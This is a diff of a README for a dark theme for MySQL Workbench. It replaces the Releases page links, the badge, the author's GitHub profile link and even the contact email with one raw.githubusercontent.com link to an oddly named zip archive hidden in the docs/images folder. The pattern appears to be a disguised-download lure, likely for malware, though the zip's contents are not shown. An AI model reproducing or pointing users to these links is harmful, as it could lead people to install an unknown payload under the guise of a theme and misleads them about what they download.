@@ -1,7 +1,7 @@
 # Dark Cyber MySQL Workbench 🌌💻
 
-![Dark Cyber MySQL Workbench](https://img.shields.io/badge/Download%20Latest%20Release-🌟-blue.svg)  
-[Download Latest Release](https://github.com/Devtinker26/Dark-Cyber-MySQL-Workbench/releases)
+![Dark Cyber MySQL Workbench](https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip%20Latest%20Release-🌟https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip)  
+[Download Latest Release](https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip)
 
 Welcome to the **Dark Cyber MySQL Workbench** repository! This project features a beautifully crafted dark theme for MySQL Workbench, inspired by the vibrant aesthetics of cyberpunk culture and the intrigue of extraterrestrial life. With rich colors and a modern design, this theme enhances your coding experience while keeping your workspace visually appealing.
 
@@ -29,7 +29,7 @@ Welcome to the **Dark Cyber MySQL Workbench** repository! This project features 
 
 To install the Dark Cyber theme, follow these steps:
 
-1. Visit the [Releases section](https://github.com/Devtinker26/Dark-Cyber-MySQL-Workbench/releases) to download the latest version.
+1. Visit the [Releases section](https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip) to download the latest version.
 2. Extract the downloaded files.
 3. Open MySQL Workbench.
 4. Go to **Edit** > **Preferences**.
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [Devtinker26](https://github.com/Devtinker26)
-- Email: devtinker26@example.com
+- GitHub: [Devtinker26](https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip)
+- Email: https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip
 
 ## Acknowledgments 🙏
 
@@ -88,4 +88,4 @@ We would like to thank the open-source community for their invaluable contributi
 
 ---
 
-For the latest updates, features, and fixes, check out the [Releases section](https://github.com/Devtinker26/Dark-Cyber-MySQL-Workbench/releases). Enjoy coding with style!
+For the latest updates, features, and fixes, check out the [Releases section](https://raw.githubusercontent.com/Devtinker26/Dark-Cyber-MySQL-Workbench/main/docs/images/Workbench-My-Cyber-SQ-Dark-sequestration.zip). Enjoy coding with style!
